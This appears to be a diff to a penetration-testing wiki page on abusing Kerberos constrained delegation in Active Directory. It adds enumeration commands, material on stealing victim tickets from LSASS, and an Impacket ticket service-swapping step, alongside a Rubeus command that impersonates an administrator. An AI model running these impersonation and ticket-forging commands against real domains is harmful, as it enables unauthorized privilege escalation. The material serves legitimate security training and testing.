@@ -6,10 +6,10 @@
 
 Using this a Domain admin can **allow** a computer to **impersonate a user or computer** against any **service** of a machine.
 
-- **Service for User to self (_S4U2self_):** If a **service account** has a _userAccountControl_ value containing [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D), then it can obtain a TGS for itself (the service) on behalf of any other user.
-- **Service for User to Proxy(_S4U2proxy_):** A **service account** could obtain a TGS on behalf any user to the service set in **msDS-AllowedToDelegateTo.** To do so, it first need a TGS from that user to itself, but it can use S4U2self to obtain that TGS before requesting the other one.
+- **Service for User to self (_S4U2self_):** Any **service account that owns an SPN** can usually obtain a TGS to itself on behalf of an arbitrary user. If the account also has [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) in _userAccountControl_, that TGS is **forwardable**, which is what makes protocol transition directly useful for **classic constrained delegation**.
+- **Service for User to Proxy(_S4U2proxy_):** A **service account** can obtain a TGS on behalf of a user to the SPNs listed in **msDS-AllowedToDelegateTo**. The evidence ticket used in S4U2Proxy must be a **forwardable** ticket to the delegating service: either a real client-to-service ticket captured from the victim or one generated with **S4U2Self + T2A4D**.
 
-**Note**: If a user is marked as ‘_Account is sensitive and cannot be delegated_ ’ in AD, you will **not be able to impersonate** them.
+**Note**: If a user is marked as ‘_Account is sensitive and cannot be delegated_’ in AD, or is a member of **Protected Users**, you will usually **not be able to impersonate** them through constrained delegation. In modern domains, prefer **AES** material over RC4-only assumptions when targeting delegation-enabled accounts.
 
 This means that if you **compromise the hash of the service** you can **impersonate users** and obtain **access** on their behalf to any **service** over the indicated machines (possible **privesc**).
 
@@ -26,10 +26,27 @@ Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowed
 ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
 ```
 
+```bash:Linux / LDAP enumeration
+# NetExec: enumerate constrained / unconstrained / RBCD in one shot
+nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation
+
+# bloodyAD / msldap: LDAP-first enumeration from Linux
+bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
+bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
+```
+
+**Operator note:** don't trust **ADUC** or BloodHound screenshots alone for **gMSA/sMSA** review. Those accounts often hide the usual Delegation tab, so enumerate the raw **`userAccountControl`** and **`msDS-AllowedToDelegateTo`** attributes directly.
+
 ```bash:Quick Way
 # Generate TGT + TGS impersonating a user knowing the hash
 Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
 ```
+
+### Protocol-transition vs Kerberos-only constrained delegation
+
+If the compromised account has **T2A4D**, you can usually complete the full **`S4U2Self -> S4U2Proxy`** chain from only the service key/TGT.
+
+If it only has **`msDS-AllowedToDelegateTo`** (the classic **"Use Kerberos only"** mode), the delegation can still be abusable, but the evidence ticket for S4U2Proxy must be a **real forwardable user-to-service ticket** for the delegating service. In practice that means stealing or capturing a victim TGS from **LSASS/ccache** and feeding it into the second stage (`/tgs:` in Rubeus). A **non-forwardable** S4U2Self ticket is **not** enough for classic constrained delegation; if that is your only evidence ticket, check [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) instead.
 
 ### Cross-domain constrained delegation notes (2025+)
 
@@ -56,9 +73,14 @@ getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
 # Inject resulting ccache
 export KRB5CCNAME=Administrator.ccache
 smbclient -k //dc.contoso.local/C$ -c 'dir'
+
+# If you already have a ticket/ccache for the right host, rewrite only the service class offline
+# (same SPN-swapping idea as Rubeus /altservice)
+tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
+export KRB5CCNAME=Administrator_HOST.ccache
 ```
 
-If you prefer forging the user ST first (e.g., offline hash only), pair **ticketer.py** with **getST.py** for S4U2Proxy. See the open Impacket issue #1713 for current quirks (KRB_AP_ERR_MODIFIED when the forged ST doesn't match the SPN key).
+If you prefer forging the user ST first (e.g., offline hash only), pair **ticketer.py** with **getST.py** for S4U2Proxy. `tgssub.py` is also handy when you already have a working ccache and only need to swap the service class for the same host. See the open Impacket issue #1713 for current quirks (KRB_AP_ERR_MODIFIED when the forged ST doesn't match the SPN key).
 
 ### Automating delegation setup from low-priv creds
 
@@ -132,6 +154,6 @@ Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.
 
 ## References
 - [Kerberos Constrained Delegation Overview (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
-- [Impacket issue #1713 – S4U2proxy forged service ticket errors](https://github.com/fortra/impacket/issues/1713)
+- [Abusing Delegation with Impacket (Part 2): Constrained Delegation (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
 
 {{#include ../../banners/hacktricks-training.md}}
